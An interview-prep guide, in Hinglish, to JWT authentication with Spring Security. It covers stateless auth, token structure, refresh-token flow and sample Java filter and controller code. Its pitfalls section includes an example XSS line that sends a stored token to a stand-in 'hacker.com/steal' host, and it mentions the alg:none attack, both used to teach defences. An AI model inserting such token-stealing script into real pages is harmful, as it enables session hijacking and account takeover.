# JWT + Spring Security — Complete Interview Reference

> **Most-asked authentication topic.** 80%+ Java backend interviews mein puchte. Theory deep + visualization-heavy.

---

## WHY — Asli zaroorat (problem statement)

### Real-world analogy — Hotel keycard

```
Reception (Login):
   Tu → username + password (ID proof)
   Reception → verify karta + tujhe KEYCARD deta

Tu room ke darwaze pe:
   Keycard tap → darwaza khulta
   Reception ko check nahi karna padta har baar

Keycard mein kya hai?
   Tera naam + room number + checkout date — encoded
   Hotel ki signature (verify ho sake nakli nahi hai)
```

**JWT ka same concept** — keycard = JWT token.

---

## Without JWT — Traditional Session-Based Auth

```
1. User login → server username/password verify
2. Server SESSION banata memory mein:
       sessionId: "abc123"
       userId: 5
       role: admin
3. Browser ko cookie deta: "sessionId=abc123"
4. Har request → cookie bhejti → server lookup → user identify
```

### Visual

```
   Login                       Each request
   ─────                       ────────────

  User → Server                User → Server
        ↓ verify                     ↓ "Hi I'm sessionId abc123"
        ↓ create session              ↓ Server lookup memory
        ↓ store: {abc → user5}        ↓ "Found user 5, authorized"
        ↓                             ↓
        ← cookie: abc123              ← response

Server STATEFUL — sessions stored in memory/DB
```

### Problems with sessions

| Problem | Painful kyu |
|---|---|
| **Server stateful** | Crash = sessions lost |
| **Scaling hard** | Multi-server load balancer? Session sticky karna padta |
| **Microservices unfriendly** | 10 services = central session store (bottleneck) |
| **DB hit per request** | Performance hit |

---

## With JWT — Token-Based Auth (Modern)

**Core idea:** Token mein user ki info embed (signed). Server stateless.

```
1. User login → server verify
2. Server JWT TOKEN banata with user info + signature
3. Token user ko deta — server kuch store nahi karta
4. Har request: Authorization: Bearer <token>
5. Server signature verify karta — extract user info
6. NO DB lookup, NO session storage
```

### Visual

```
   Login                       Each request
   ─────                       ────────────

  User → Server                User → Server
        ↓ verify                     ↓ Header: Bearer eyJ...
        ↓ generate JWT                ↓ Server verifies signature
        ↓ (no storage!)               ↓ Extract user from token
        ↓                             ↓ NO DB hit
        ← JWT token                   ← response

Server STATELESS — har token self-contained
```

---

## Stateless Magic Visual

```
              SERVER (stateless)
                    │
                    ↓
    ┌───────────────────────────────────┐
    │ Sirf SECRET key store karta       │
    │                                   │
    │ Token aaya?                       │
    │ → signature verify (with SECRET)  │
    │ → user info extract               │
    │ → done                            │
    └───────────────────────────────────┘

   Server crash? Multiple servers? No problem.
   Token har jagah work karta — server doesn't store state.
```

---

# STATELESS DEEP DIVE — Yeh Concept Saaf Karte

> **Stateless = "Server kuch yaad nahi rakhta"**. Server **previous requests** ke baare mein **kuch information store nahi karta**. Har request **self-contained** — saari info request mein hi aati hai.

> **Stateful = "Server yaad rakhta hai"**. Server memory/DB mein state maintain karta — "tu kaun hai", "tu kya kar raha tha pehle", etc.

---

## Real-world analogy

### Stateful — Bank Teller (familiar bank)
```
Tu: "Hi"
Teller: "Arpan! Account 12345, balance 50K, pichli baar tu ne 10K nikale the.
         Aaj kya help chahiye?"

↑ Teller TUJHE PEHCHAN-TA hai. Tujhe ID dikhane ki zaroorat nahi.
↑ Teller ke dimaag mein TERA "state" stored hai.
```

### Stateless — ATM (random ATM in any city)
```
Tu: "Hi"
ATM: "Card daal."
Tu: card + PIN.
ATM: "Account verified, kitna nikalna?"
Tu: 5K
ATM: "Done."

(Next visit, same flow):
ATM: "Card daal." ← machine ko TUJHE pehchanne ki memory NAHI hai.

↑ Har transaction independent.
↑ Machine kuch yaad nahi rakhti.
↑ Tu kahin bhi ATM jaa — same flow.
```

---

## Server Visual — Stateful vs Stateless

### Stateful Server (Session-based)

```
   ┌─────────────────────────────────┐
   │   SERVER (memory/DB)            │
   │   ┌───────────────────────┐     │
   │   │ SESSION STORE         │     │
   │   │  abc123 → user5 admin │     │  ← server remembers
   │   │  xyz789 → user8 user  │     │
   │   │  pqr456 → user3 admin │     │
   │   └───────────────────────┘     │
   └────────────┬────────────────────┘
                │
   Request 1    │    Request 2
   ─────────    │    ─────────
   Cookie:      │    Cookie:
   abc123       │    abc123
                ▼
            "Lookup karu memory mein...
             abc123 = user5 admin.
             OK ab process karu."
```

**Problem:** Server memory mein state — crash = state gone, multi-server = sync hell.

---

### Stateless Server (JWT)

```
   ┌─────────────────────────────────┐
   │   SERVER                        │
   │   ┌───────────────────────┐     │
   │   │  Sirf SECRET key      │     │
   │   │  (validation ke liye) │     │
   │   └───────────────────────┘     │
   │                                 │
   │   No session store, no memory   │
   │   No "remember" anything        │
   └────────────┬────────────────────┘
                │
   Request 1    │    Request 2
   ─────────    │    ─────────
   Bearer:      │    Bearer:
   eyJ... (JWT) │    eyJ... (different JWT)
                ▼
            "Token mein hi user info hai.
             Signature verify kar liya = trust kar leta.
             Memory mein lookup ki zaroorat nahi."
```

**Magic:** Server kuch yaad nahi rakhta. **Token har request mein khud apni identity laata.**

---

## Asli benefit — Multi-server load-balanced setup

### Scenario: 3 server pe load-balanced

```
                  ┌──────────────┐
                  │ Load Balancer│
                  └──────┬───────┘
                         │
           ┌─────────────┼─────────────┐
           ▼             ▼             ▼
       ┌───────┐     ┌───────┐     ┌───────┐
       │Server1│     │Server2│     │Server3│
       └───────┘     └───────┘     └───────┘
```

### Stateful (Session) — Painful

```
Login   → goes to Server 1
        → Server 1 ke memory mein: "abc123 → user5"
        ← cookie returned

Next request → Load balancer randomly Server 2 pe bhej diya
        → Server 2 ko abc123 ka pata NAHI
        → "Session not found" — re-login!

Solutions (sab painful):
  1. Sticky sessions (LB user ko same server pe pin kare) — uneven load
  2. Centralized session store (Redis) — extra infra + bottleneck
  3. Session replication (servers sync) — slow + complex
```

### Stateless (JWT) — Smooth

```
Login   → goes to Server 1
        → Server 1 generates JWT, NOT stored
        ← token returned

Next request → Load balancer Server 2 pe bhej diya
        → Server 2 token validate kar leta (SECRET hai uss paas)
        → user identified from token payload

Multi-server "just works" — no session sync, no Redis, no sticky.
```

**Yahin JWT ka sabse bada win — multi-server scaling.**

---

## Stateless ke 3 core properties

```
1. Server kuch store NAHI karta requests ke beech
   (no in-memory sessions, no DB session table)

2. Har request SELF-CONTAINED
   (saari info request mein — token, headers, body)

3. Server "scale-out" easily kar sakta
   (any server can handle any request — no sync needed)
```

---

## Stateful vs Stateless Summary

| Property | Stateful | Stateless |
|---|---|---|
| Server memory | Stores user sessions | Stores **nothing** |
| Server crash | Sessions gone (re-login) | No impact (token valid) |
| Multi-server | Sticky/sync needed | Trivially scales |
| Token contains | Just opaque ID | Full user info (signed) |
| Per-request | DB/memory lookup | Just signature check |
| Storage cost | Grows with users | Constant (just SECRET) |
| Real-world | Banking, Java EE traditional | Microservices, REST APIs |

---

## Spring Security mein `STATELESS` setting

```java
http.sessionManagement(session ->
    session.sessionCreationPolicy(SessionCreationPolicy.STATELESS)
);
```

Yeh line bolti: **"Spring, koi `HttpSession` mat banao. Har request fresh treat karo. JWT se hi pata chalega user kaun hai."**

---

## Power phrase

> **"Stateless ka matlab — server ko TUJHE yaad rakhne ki zaroorat nahi. Token har request ke saath khud apni identity laata. Server SECRET se signature verify kar leta — kuch DB lookup nahi, kuch memory store nahi. Yeh distributed systems ke liye natural fit hai."**

---

## Memory hook

```
Stateful   =  Bank teller (yaad rakhta tujhe)
Stateless  =  ATM (har baar fresh, machine kuch nahi yaad)

JWT = ATM-style auth — token har baar khud identity laata,
                       server kuch store nahi karta
```

---

## Session vs JWT Comparison

| Feature | Session | JWT |
|---|---|---|
| Server state | Stateful | **Stateless** |
| Scaling | Hard | Easy |
| Microservices | Painful | Native fit |
| Mobile apps | Awkward | Natural fit |
| Performance | DB hit/request | No DB hit |
| Logout | Easy | Hard (token valid till exp) |
| Token revocation | Easy | Tricky (need blacklist) |
| XSS risk | Less (httpOnly cookie) | More (localStorage common) |

---

# JWT STRUCTURE — Token Andar Kya Hota?

## Token skeleton

```
xxxxx.yyyyy.zzzzz
  │     │     │
  │     │     └─→ SIGNATURE (verification)
  │     └───────→ PAYLOAD (user data)
  └─────────────→ HEADER (metadata)
```

**Real example:**
```
eyJhbGciOiJIUzI1NiIs.eyJzdWIiOiJ1c2VyNSIs.dBjftJeZ4CVP_mw7
       Header              Payload          Signature
```

---

## Part 1: HEADER — Metadata

```json
{
  "alg": "HS256",       ← signing algorithm
  "typ": "JWT"          ← token type
}
```

Common algorithms:
- **`HS256`** — HMAC + SHA-256 (symmetric — same secret on both sides)
- **`RS256`** — RSA + SHA-256 (asymmetric — public/private keys)

**Encoded:** Base64URL → `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`

---

## Part 2: PAYLOAD — Claims (User Data)

```json
{
  "sub": "user5",                      ← Subject (userId)
  "name": "Arpan",                     ← Custom claim
  "role": "admin",                     ← Custom claim
  "iat": 1706443200,                   ← Issued At
  "exp": 1706446800                    ← Expiration
}
```

### Standard Claims (RFC 7519)

| Claim | Meaning |
|---|---|
| `sub` | Subject — kaun? (userId) |
| `iss` | Issuer — kisne issue (your-app.com) |
| `aud` | Audience — kiske liye (api.your-app.com) |
| `exp` | Expiration — kab expire (Unix timestamp) |
| `iat` | Issued At |
| `nbf` | Not Before |
| `jti` | JWT ID (unique — revocation tracking) |

**Custom claims allowed:** `role`, `email`, `tenantId`, `permissions: [...]` — kuch bhi.

---

## CRITICAL — Payload READABLE, not encrypted!

```
Anyone with token kar sakta:
  1. Copy token
  2. Paste at jwt.io
  3. See ALL payload data
```

**Iron rule — Payload mein NEVER:**
- Password
- Credit card
- Sensitive personal data
- API keys

**Payload mein OK:**
- User ID
- Username
- Role/permissions
- Public profile data

---

## Part 3: SIGNATURE — Verification Magic

```
signature = HMACSHA256(
    base64UrlEncode(header) + "." + base64UrlEncode(payload),
    SECRET_KEY
)
```

### Why tamper-proof?

```
Original token:
   header.payload.signature

Hacker payload modify kare:
   header.HACKED_payload.signature
                 ↑
   Server signature recompute kare apne SECRET se:
   HMACSHA256(header + "." + HACKED_payload, SECRET)
                                                ↓
   New signature = "xyz123"
   Token mein signature = "abc456" ← original
   xyz123 ≠ abc456  →  TAMPERING DETECTED
   Token rejected.
```

**Key insight:** Server SECRET sirf server ke paas → hacker signature regenerate nahi kar sakta.

---

## Full token assembly visual

```
┌──────────────────────────────────────────────────────────┐
│  HEADER       │  PAYLOAD          │  SIGNATURE           │
│  ───────      │  ────────         │  ─────────           │
│  {            │  {                │                      │
│   alg: HS256, │   sub: "user5",   │  HMACSHA256(         │
│   typ: JWT    │   role: "admin",  │    header + "." +    │
│  }            │   exp: 1706...    │    payload,          │
│               │  }                │    SECRET            │
│               │                   │  )                   │
│  Base64Url    │  Base64Url        │  Base64Url           │
│  ↓            │  ↓                │  ↓                   │
│  eyJhbGc...   │  eyJzdWI...       │  dBjftJeZ4...        │
└─────────┬─────┴────────┬──────────┴──────────┬───────────┘
          │              │                     │
          └──────────────┴─────────────────────┘
                         │
                  Joined by "."
                         │
                         ▼
        eyJhbGc...eyJzdWI...dBjftJeZ4...
              (Final JWT token)
```

---

# AUTHENTICATION FLOW — Login → Token → Protected → Logout

## Big picture

```
┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│  STEP 1: LOGIN                                                  │
│  ──────────                                                     │
│   Client → POST /auth/login { username, password }              │
│              ↓                                                  │
│   Server → BCrypt verify password                               │
│           Generate JWT (signed)                                 │
│              ↓                                                  │
│   Client ← { token: "eyJhbGc..." }                              │
│           Stores in localStorage / cookie / mobile keystore     │
│                                                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  STEP 2: PROTECTED REQUEST                                      │
│  ─────────────────────────                                      │
│   Client → GET /users/me                                        │
│           Authorization: Bearer eyJhbGc...                      │
│              ↓                                                  │
│   Server → Extract token from header                            │
│           Verify signature with SECRET                          │
│           Check exp not expired                                 │
│           Extract user info from payload                        │
│           valid? → process; → 401                         │
│              ↓                                                  │
│   Client ← user data                                            │
│                                                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  STEP 3: LOGOUT                                                 │
│  ──────────────                                                 │
│   Client → discards token                                       │
│           Server: stateless — token still valid till exp     │
│           Solution: short access + refresh tokens, OR blacklist │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

# ACCESS + REFRESH TOKEN — Full Lifecycle

## T=0 — LOGIN (initial)

```
┌─────────────────────────────────────────────────────────────────┐
│  Step 1: User login                                             │
│   CLIENT ──► POST /auth/login                                   │
│              { username: "arpan", password: "secret" }          │
└────────────────────────────┬────────────────────────────────────┘
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│  Step 2: Server verify + 2 tokens generate                      │
│   SERVER:                                                       │
│     Password match (BCrypt)                                  │
│     accessToken  = JWT { sub:5, exp: T+15min }  → "AAAA..."     │
│     refreshToken = random UUID                  → "RRRR..."     │
│                                                                 │
│     // refreshToken DB mein store karta                         │
│     refreshTokenRepo.save(new RefreshToken("RRRR", userId=5,    │
│                                            expiresAt=T+7days))  │
└────────────────────────────┬────────────────────────────────────┘
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│  Step 3: Both tokens client ko return                           │
│   CLIENT ◄── 200 OK                                             │
│              { accessToken: "AAAA...", refreshToken: "RRRR..." }│
│   CLIENT:                                                       │
│     localStorage.setItem("accessToken", "AAAA...")              │
│     localStorage.setItem("refreshToken", "RRRR...")             │
└─────────────────────────────────────────────────────────────────┘
```

---

## T=0 to T=15min — NORMAL API CALLS

```
   CLIENT                              SERVER
   ──────                              ──────
   GET /users/me                  ──►  Validate "AAAA..."
   Authorization: Bearer AAAA...        signature OK
                                        exp not passed
                                  ◄──   200 OK { user data }

   ... (har request access token bhejta) ...
```

Server: signature + exp se verify. **NO DB hit** — pure stateless.

---

## T=15min — ACCESS EXPIRED → REFRESH

```
┌─────────────────────────────────────────────────────────────────┐
│  Step 1: Access token expire                                    │
│   CLIENT ──► GET /users/me                                      │
│              Authorization: Bearer AAAA...                      │
│   SERVER:                                                       │
│     exp = T+15min, current = T+15:01 → EXPIRED               │
│   CLIENT ◄── 401 Unauthorized                                   │
└────────────────────────────┬────────────────────────────────────┘
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│  Step 2: Frontend interceptor refresh karta (USER ko pata nahi) │
│   CLIENT (interceptor):                                         │
│     refreshToken = localStorage.getItem("refreshToken")         │
│     POST /auth/refresh { refreshToken: "RRRR..." }              │
└────────────────────────────┬────────────────────────────────────┘
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│  Step 3: Server refresh verify + naya access issue              │
│   SERVER:                                                       │
│     1. DB lookup: refreshTokenRepo.findByToken("RRRR")          │
│     2. Mila? expired nahi? user active?                         │
│        ├─ NO  → 401, force re-login                             │
│        └─ YES → newAccessToken = JWT { sub:5, exp:T+15min }     │
│   CLIENT ◄── { accessToken: "BBBB..." }                         │
│                                                                 │
│   CLIENT:                                                       │
│     localStorage.setItem("accessToken", "BBBB...")              │
│     // Original failed request retry karo                       │
│     GET /users/me with Bearer BBBB...                           │
└─────────────────────────────────────────────────────────────────┘
```

**Key:** Interceptor ne sab kuch automatic kiya — user ko sirf 1 sec extra laga, baaki kuch pata bhi nahi chala.

---

## T=7 days — REFRESH TOKEN BHI EXPIRED

```
   CLIENT (interceptor):
     POST /auth/refresh { refreshToken: "RRRR..." }

   SERVER:
     expiresAt < current time
     DELETE row from DB
     return 401

   CLIENT:
     refresh bhi expired
     → user ko login page redirect
```

---

## LOGOUT

```
   CLIENT → POST /auth/logout { refreshToken: "RRRR..." }
   SERVER → refreshTokenRepo.deleteByToken("RRRR")
   CLIENT → localStorage.clear()

   Result:
     - Access token: 15 min mein apne aap expire
     - Refresh token: DB mein nahi → next refresh attempt → 401
```

---

## Two tokens lifecycle visual

```
T=0          T=5min       T=15min      T=15:01      T=30min      ...    T=7 days     T=7d+1
│            │            │            │            │                   │            │
│  Login     │            │ Access     │ /refresh   │ Access exp        │ /refresh   │
│  ──────►   │            │ exp        │ ──────►    │ → /refresh        │ → 401      │
│  ◄── A,R   │            │            │ ◄── B      │                   │            │
│            │            │            │            │                   │            │
│ A used     │ A used     │ A       │ B used     │                   │ Re-login   │
│            │            │            │            │                   │            │
│            │            │ R sent     │            │ R sent again      │ R deleted  │
└────────────┴────────────┴────────────┴────────────┴───────────────────┴────────────┘
              (15 min access window)          (next 15 min)             (7 day window)

Legend:
  A = first access token   "AAAA..."
  B = second access token  "BBBB..." (new after refresh)
  R = refresh token        "RRRR..." (same throughout — 7 days)
```

---

# SPRING SECURITY INTEGRATION

## Spring Filter Chain (where JWT plugs in)

```
HTTP Request
     │
     ▼
 ┌──────────────────────────────────────┐
 │       Spring Filter Chain            │
 │                                      │
 │  ┌────────────────────────────┐      │
 │  │  CORS Filter               │      │
 │  └────────────┬───────────────┘      │
 │               │                      │
 │  ┌────────────▼───────────────┐      │
 │  │  CSRF Filter               │      │
 │  └────────────┬───────────────┘      │
 │               │                      │
 │  ┌────────────▼───────────────┐      │
 │  │  JwtFilter (CUSTOM)     │      │ ← yahan tu JWT validate karta
 │  │  (extends                  │      │
 │  │   OncePerRequestFilter)    │      │
 │  └────────────┬───────────────┘      │
 │               │                      │
 │  ┌────────────▼───────────────┐      │
 │  │  Authentication Filter     │      │
 │  └────────────┬───────────────┘      │
 │               │                      │
 │  ┌────────────▼───────────────┐      │
 │  │  Authorization Filter      │      │ ← @PreAuthorize check
 │  └────────────┬───────────────┘      │
 │               │                      │
 └───────────────┼──────────────────────┘
                 ▼
            Controller method runs
                 ▼
              Response
```

---

## Components needed (Spring side)

```
1. SecurityConfig         → Filter chain configure
2. JwtFilter              → Each request mein JWT extract + validate
3. JwtService             → Token generate / parse / verify
4. UserDetailsService     → User load karne ke liye DB se
5. AuthController         → /login, /refresh, /logout endpoints
6. PasswordEncoder        → BCrypt for password hashing
```

---

## 1 `JwtService` — Token generate/parse

```java
@Service
public class JwtService {

    @Value("${jwt.secret}")
    private String secret;

    @Value("${jwt.expiration}")  // 15 min in milliseconds
    private long expiration;

    // ─── Generate token ─────────────────────────
    public String generateToken(User user) {
        return Jwts.builder()
            .setSubject(user.getId().toString())
            .claim("name", user.getName())
            .claim("role", user.getRole())
            .setIssuedAt(new Date())
            .setExpiration(new Date(System.currentTimeMillis() + expiration))
            .signWith(SignatureAlgorithm.HS256, secret)
            .compact();
    }

    // ─── Extract userId from token ──────────────
    public String extractUserId(String token) {
        return Jwts.parser()
            .setSigningKey(secret)
            .parseClaimsJws(token)
            .getBody()
            .getSubject();
    }

    // ─── Validate token ─────────────────────────
    public boolean isValid(String token) {
        try {
            Jwts.parser().setSigningKey(secret).parseClaimsJws(token);
            return true;   // signature + exp valid
        } catch (JwtException e) {
            return false;  // invalid/expired
        }
    }
}
```

**Used library:** `jjwt` (most popular Java JWT library).

---

## 2 `JwtFilter` — Per-request token check

```java
@Component
public class JwtFilter extends OncePerRequestFilter {

    private final JwtService jwtService;
    private final UserDetailsService userDetailsService;

    public JwtFilter(JwtService jwtService, UserDetailsService uds) {
        this.jwtService = jwtService;
        this.userDetailsService = uds;
    }

    @Override
    protected void doFilterInternal(
            HttpServletRequest request,
            HttpServletResponse response,
            FilterChain chain) throws ServletException, IOException {

        // 1. Extract token from Authorization header
        String authHeader = request.getHeader("Authorization");

        if (authHeader == null || !authHeader.startsWith("Bearer ")) {
            chain.doFilter(request, response);   // no token, pass through
            return;
        }

        String token = authHeader.substring(7);   // remove "Bearer "

        // 2. Validate
        if (!jwtService.isValid(token)) {
            chain.doFilter(request, response);
            return;
        }

        // 3. Extract user + load details
        String userId = jwtService.extractUserId(token);
        UserDetails userDetails = userDetailsService.loadUserByUsername(userId);

        // 4. Set SecurityContext (so downstream code knows who's logged in)
        UsernamePasswordAuthenticationToken auth =
            new UsernamePasswordAuthenticationToken(
                userDetails, null, userDetails.getAuthorities()
            );
        SecurityContextHolder.getContext().setAuthentication(auth);

        // 5. Continue filter chain
        chain.doFilter(request, response);
    }
}
```

---

## 3 `SecurityConfig` — Wire it all together

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    private final JwtFilter jwtFilter;

    public SecurityConfig(JwtFilter jwtFilter) {
        this.jwtFilter = jwtFilter;
    }

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf.disable())                    // stateless, no CSRF
            .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/auth/**").permitAll()      // login/refresh open
                .anyRequest().authenticated()                  // baaki sab protected
            )
            .addFilterBefore(jwtFilter, UsernamePasswordAuthenticationFilter.class);

        return http.build();
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }

    @Bean
    public AuthenticationManager authenticationManager(AuthenticationConfiguration config) throws Exception {
        return config.getAuthenticationManager();
    }
}
```

---

## 4 `AuthController` — Login + Refresh + Logout

```java
@RestController
@RequestMapping("/auth")
public class AuthController {

    private final UserRepository userRepo;
    private final RefreshTokenRepository refreshTokenRepo;
    private final JwtService jwtService;
    private final PasswordEncoder passwordEncoder;

    // ─── LOGIN ──────────────────────────────────
    @PostMapping("/login")
    public ResponseEntity<TokenResponse> login(@RequestBody LoginRequest req) {
        User user = userRepo.findByUsername(req.getUsername())
            .orElseThrow(() -> new RuntimeException("Invalid credentials"));

        if (!passwordEncoder.matches(req.getPassword(), user.getPassword())) {
            throw new RuntimeException("Invalid credentials");
        }

        String accessToken = jwtService.generateToken(user);
        String refreshTokenStr = UUID.randomUUID().toString();

        refreshTokenRepo.save(new RefreshToken(
            refreshTokenStr,
            user.getId(),
            Instant.now().plus(7, ChronoUnit.DAYS)
        ));

        return ResponseEntity.ok(new TokenResponse(accessToken, refreshTokenStr));
    }

    // ─── REFRESH ────────────────────────────────
    @PostMapping("/refresh")
    public ResponseEntity<TokenResponse> refresh(@RequestBody RefreshRequest req) {
        RefreshToken stored = refreshTokenRepo.findByToken(req.getRefreshToken())
            .orElseThrow(() -> new RuntimeException("Invalid refresh"));

        if (stored.getExpiresAt().isBefore(Instant.now())) {
            refreshTokenRepo.delete(stored);
            throw new RuntimeException("Refresh expired, login again");
        }

        User user = userRepo.findById(stored.getUserId()).orElseThrow();
        String newAccessToken = jwtService.generateToken(user);

        return ResponseEntity.ok(new TokenResponse(newAccessToken, req.getRefreshToken()));
    }

    // ─── LOGOUT ─────────────────────────────────
    @PostMapping("/logout")
    public ResponseEntity<Void> logout(@RequestBody RefreshRequest req) {
        refreshTokenRepo.deleteByToken(req.getRefreshToken());
        return ResponseEntity.ok().build();
    }
}
```

---

# SECURITY PITFALLS (interview gotchas)

### 1. **JWT in localStorage = XSS vulnerable**
```
JS attack:
   <script src="malicious.com/x.js"></script>
   fetch('hacker.com/steal?token=' + localStorage.getItem('token'));
```
**Fix:** **httpOnly cookies** (JS can't read).

### 2. **No `exp` claim** = token valid forever
**Fix:** Always set 15 min - 1 hour expiration.

### 3. **Weak SECRET** = signature breakable
**Fix:** 256-bit random secret, environment variable, NOT in code.

### 4. **HTTPS not enforced** = MITM token steal
**Fix:** HTTPS only in production.

### 5. **Sensitive data in payload**
**Fix:** User ID + role only. Never password/SSN/credit card.

### 6. **No token rotation on refresh**
**Fix:** Issue NEW refresh token on each refresh (sliding expiration).

### 7. **Algorithm confusion attack**
```
Header: { "alg": "none" }   ← hacker tries
```
**Fix:** Whitelist allowed algorithms in code, never trust `alg` from token.

---

# INTERVIEW ANSWER TEMPLATES

### Q: "JWT kya hai aur kyu use karte ho?"

> **"JWT (JSON Web Token) — stateless authentication mechanism. Login pe server token issue karta jisme user info embed + signed. Har request mein token bhejte, server signature verify karta — kuch DB lookup nahi. Sessions ke vs scaling/microservices/mobile-friendly."**

### Q: "JWT structure batao"

> **"3 parts dot-separated: Header (algorithm + type), Payload (claims — user info + exp), Signature (HMAC of header+payload with secret). Payload Base64 encoded — readable, NOT encrypted. Signature ensures integrity — tamper karega toh signature mismatch."**

### Q: "Auth flow end-to-end?"

> **"Login → BCrypt password verify → JWT generate with user info + exp claim → return to client. Client localStorage/cookie store karta. Har request mein `Authorization: Bearer <token>` header. Server JwtFilter signature verify karta + SecurityContext set karta + downstream code identify kar leta user. Stateless — no session storage."**

### Q: "Logout kaise handle?"

> **"JWT stateless — server side direct invalidate nahi ho sakta. Industry standard: short access token (15 min) + long refresh token (7 days, DB stored). Logout pe refresh token DB se delete. Worst case leak window 15 min. Sensitive apps mein additional Redis blacklist."**

### Q: "Spring Security mein JWT kaise integrate karte?"

> **"Custom `JwtFilter` extending `OncePerRequestFilter`. Filter chain mein `addFilterBefore(jwtFilter, UsernamePasswordAuthenticationFilter)` se add. Filter Authorization header se token extract karta, validate, user details load, `SecurityContextHolder` mein authentication set. `SecurityConfig` mein `sessionCreationPolicy = STATELESS`. Login/refresh endpoints `permitAll()`, baaki `authenticated()`."**

### Q: "Access aur refresh token kyu?"

> **"Security trade-off optimize. Access token har request mein bhejta — leak risk, isliye short exp (15 min). Refresh token sirf `/refresh` endpoint pe — kam exposure, long exp (7 days). DB mein store. Logout pe refresh token DB se delete — access apne aap 15 min mein expire."**

---

# KEY TAKEAWAYS

```
1. JWT = stateless authentication via signed token
2. 3 parts: header.payload.signature
3. Payload READABLE (not encrypted) — sensitive data NEVER
4. Signature = HMAC with SECRET — tamper detection
5. Access token short (15 min), Refresh token long (7 days)
6. Refresh stored in DB → logout = DB delete
7. Spring Security: JwtFilter in filter chain, SecurityContextHolder set
8. Always: HTTPS + secure SECRET + exp claim + httpOnly cookies preferred
```

---

# TRAP BOX

```
Trap 1: "JWT encrypted hota hai"
         NAHI — base64 encoded, ANYONE can read payload
         Signature ensures integrity, not confidentiality

Trap 2: "Logout instant invalidate karta"
         NAHI — token stateless, valid till exp
         Use short tokens + refresh + optional blacklist

Trap 3: "Password JWT payload mein store kar du"
         NEVER — payload publicly readable
         Sirf userId + role + non-sensitive claims

Trap 4: "Frontend ko refresh logic likhna padta har component mein"
         NAHI — interceptor 1 jagah likho, automatic

Trap 5: "SECRET code mein hardcode kar du"
         NEVER — environment variable / secrets manager

Trap 6: "Authorization header bina Bearer prefix bhej de"
         Standard convention break — "Bearer <token>" mandatory
```

---

# MEMORY HOOKS

```
JWT                   =  "Signed token = stateless auth"
Header.Payload.Sig    =  "Algo, claims, HMAC"

Payload READABLE      =  "Public — base64 encoded, not encrypted"
Signature             =  "HMAC with SECRET — tamper proof"

Access token          =  "Short (15 min) — sent every request"
Refresh token         =  "Long (7 days) — DB stored, sent only to /refresh"

Spring filter chain   =  "JwtFilter early — extract + validate + set SecurityContext"
JwtFilter             =  "extends OncePerRequestFilter"
SessionCreationPolicy =  "STATELESS — no HttpSession"

Logout                =  "Refresh token DB delete (access expires by itself)"
```

---

# FINAL VISUAL — JWT full ecosystem

```
                    ┌────────────────────────┐
                    │       USER             │
                    └──────┬───────────┬─────┘
                           │           │
                  Login    │           │  Protected request
                  (creds)  │           │  (Bearer token)
                           ▼           ▼
                    ┌────────────────────────┐
                    │   AuthController       │
                    │   /login   /refresh    │
                    │   /logout              │
                    └──────┬─────────────────┘
                           │
           ┌───────────────┼────────────────────┐
           ▼               ▼                    ▼
      JwtService    UserRepo            RefreshTokenRepo
      (generate/    (BCrypt verify)     (DB store/delete)
       parse JWT)
                                              ↑
                                              │ DB
                                       ┌──────┴─────┐
                                       │   MySQL    │
                                       └────────────┘

                        ──── REQUEST FLOW ────

                    ┌────────────────────────┐
                    │     HTTP Request       │
                    └──────────┬─────────────┘
                               │
                  ┌────────────▼────────────────┐
                  │   Spring Filter Chain       │
                  │   ┌────────────────────┐    │
                  │   │  JwtFilter      │    │
                  │   │  - Extract token   │    │
                  │   │  - Validate        │    │
                  │   │  - Set Security    │    │
                  │   │    Context         │    │
                  │   └────────┬───────────┘    │
                  └────────────┼────────────────┘
                               ▼
                    ┌────────────────────────┐
                    │     Controller         │
                    │     (logic)            │
                    └──────────┬─────────────┘
                               ▼
                          Response
```
